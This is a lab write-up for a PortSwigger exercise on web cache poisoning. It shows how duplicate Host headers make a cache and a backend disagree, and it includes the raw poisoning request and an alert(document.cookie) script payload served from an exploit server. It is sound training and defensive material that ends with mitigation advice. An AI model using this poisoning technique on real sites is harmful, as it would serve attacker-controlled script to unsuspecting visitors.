# Web cache poisoning via ambiguous requests

**Category:** HTTP Host Header Attacks
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests

A reflected Host header is usually a shrug — it's not directly exploitable against the person who
sent the request, since nobody can force a victim to send a malicious header on their own browser's
behalf. Caching changes that math completely. If a response built from a poisoned Host header gets
stored and replayed to other visitors, the "reflected, so what" bug becomes a stored one that hits
every user who loads the cached page, without any of them doing anything wrong.

## The Target

The homepage includes a script tag built from the Host header: `<script src="//HOST/resources/js/tracking.js">`.
Responses carry `Cache-Control: max-age=30` and an `X-Cache: hit`/`miss` header, confirming there's a
cache sitting in front of the application. The question is whether the cache and the backend agree
on what "the Host header" actually is for a given request.

## The Investigation

The interesting case here isn't a single Host header — it's two of them on the same request. Most
HTTP client libraries either refuse to construct a request with duplicate headers or silently
deduplicate them before sending, which meant `httpx` (and effectively every high-level HTTP library
we tried) couldn't be used to actually test this. We had to drop to raw TLS sockets and build the
request bytes by hand to send genuinely duplicate `Host` lines.

With that in place, the test was simple: send `Host: legitimate.com` followed by a second
`Host: exploit-domain` header on the same request, and see which one shows up in the response's
`tracking.js` script `src`. It came back pointing at the second, attacker-supplied Host — the
backend was using the last Host header it saw when building that URL. The open question then became
whether the *cache* made the same choice. If the cache also keyed on the second header, poisoning
would only ever affect requests that already carried our exact duplicate-header combination, which
isn't useful. If the cache keyed on the *first* header instead, then a single poisoned request could
get cached under the same key as a completely ordinary request for the legitimate domain — meaning
every subsequent normal visitor would be served the poisoned response.

That's the discrepancy this lab is built around: the cache and the backend disagree about which of
two duplicate Host headers is authoritative. The cache keys on the first, the backend renders URLs
from the second.

## The Exploit

We configured the exploit server to serve `alert(document.cookie)` at
`/resources/js/tracking.js`, then waited past the 30-second `max-age` for any existing cache entry
to expire. The poisoning request, sent over a raw TLS socket:

```
GET / HTTP/1.1
Host: <legitimate-lab-domain>
Host: <exploit-server-domain>
Cookie: <session cookies>
Connection: close
```

The response confirmed `tracking.js` now resolved against the exploit domain. A follow-up plain
`GET /` — no duplicate headers, no manual socket work, just a normal request — came back with
`X-Cache: hit` and the poisoned `tracking.js` reference still intact, proving the cache had stored
the poisoned version under the legitimate page's cache key and was now serving it to anyone who
asked for that page normally. (Our notes also record that a lowercase second header,
`host: exploit-domain`, works just as well — a second, independent parsing quirk on top of the
duplication itself.)

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's own solution reaches the same duplicate-Host discrepancy, but gets there with an extra
step we skipped: they first add a cache-busting query parameter to isolate their own testing from
the shared cache, confirm that a second Host header is effectively ignored for *validation* purposes
while still being reflected into the script import, and only then build the real poisoning request —
sent without the cache-buster, so it lands in the shared cache key used by every other visitor.

The underlying technique is identical to ours: duplicate `Host` headers, first one wins the cache
key, second one wins the rendered URL. The meaningful difference is tooling, and it's not optional
here the way it sometimes is in other labs — Burp Repeater can send genuinely duplicate headers
because it gives you direct control over the raw request text, while `httpx` and essentially every
standard HTTP client cannot construct such a request at all. That's why our script drops to a raw
socket for this one rather than using the same `httpx.Client` that handles every other request in
this series.

## What This Teaches Us

This lab is really about a parsing disagreement between two systems that both think they're reading
"the" Host header from the same request, when the request itself is ambiguous enough that "the" Host
header isn't well-defined. Any time a cache and an origin server independently parse the same raw
bytes, there's an opportunity for them to reach different conclusions — and whichever one is wrong
ends up serving the other's version of the truth. The fix has to close that gap at the source: reject
requests with duplicate or ambiguous Host headers outright, and make sure whatever value the cache
uses as a key is the same value the backend treats as the request's actual origin.
